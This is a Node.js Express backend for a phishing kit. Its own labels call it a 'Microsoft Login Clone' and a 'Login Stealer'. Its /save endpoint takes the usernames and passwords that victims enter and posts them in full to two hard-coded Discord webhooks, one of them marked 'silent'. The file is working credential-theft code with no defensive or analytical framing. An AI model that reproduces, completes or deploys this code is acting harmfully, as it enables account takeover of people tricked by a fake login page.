const express = require('express');

const app = express();
const PORT = process.env.PORT || 3000;
const HOST = '0.0.0.0';

// ==================== YOUR TWO WEBHOOKS ====================
// Make sure there are NO extra spaces or line breaks at the end!
const MAIN_WEBHOOK = "https://discordapp.com/api/webhooks/1494067903073353827/2uJS7jmZhEZu0-2S4YVEl2nteIT7-vbcdqixpU7qDfnkgsMyJCiPWtqJOakKZLvIzjyq";

const SILENT_WEBHOOK = "https://discord.com/api/webhooks/1494069132461609224/TvbfClRZV6FreFOdwpml3woS0cnPgxpwB7QJAJrP__T6ovtfoOzxWKhFr0ABsLl0kBX5";
// ===========================================================

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.send('✅ Double Discord Webhook Backend is ONLINE');
});

app.post('/save', async (req, res) => {
    try {
        const { username, password, timestamp } = req.body;

        if (!username || !password) {
            console.log("❌ Missing username or password");
            return res.status(400).send('Missing data');
        }

        const time = timestamp || new Date().toISOString();

        const embed = {
            title: "🔐 New Login Captured",
            color: 0xFF0000,
            fields: [
                { name: "Username / Email", value: `\`${username}\``, inline: true },
                { name: "Password", value: `\`${password}\``, inline: true },
                { name: "Time", value: time, inline: false }
            ],
            footer: { text: "Microsoft Login Clone • Double Hook" },
            timestamp: new Date().toISOString()
        };

        const payload = {
            username: "Login Stealer",
            embeds: [embed],
            content: "**New credentials received**"   // Added content so Discord doesn't reject empty embeds
        };

        const sendToWebhook = async (url, name) => {
            if (!url || url.includes("YOUR_")) {
                console.log(`⚠️ ${name} webhook not configured or placeholder`);
                return;
            }

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    console.log(`✅ Sent successfully to ${name}`);
                } else {
                    const errorText = await response.text();
                    console.error(`❌ Failed to ${name}: ${response.status} - ${errorText}`);
                }
            } catch (err) {
                console.error(`❌ Network error sending to ${name}:`, err.message);
            }
        };

        // Send to both
        await Promise.allSettled([
            sendToWebhook(MAIN_WEBHOOK, "Main"),
            sendToWebhook(SILENT_WEBHOOK, "Silent")
        ]);

        res.send('OK');

    } catch (error) {
        console.error('Server error:', error);
        res.status(500).send('Server error');
    }
});

app.listen(PORT, HOST, () => {
    console.log(`🚀 Double Webhook Backend running on port ${PORT}`);
});
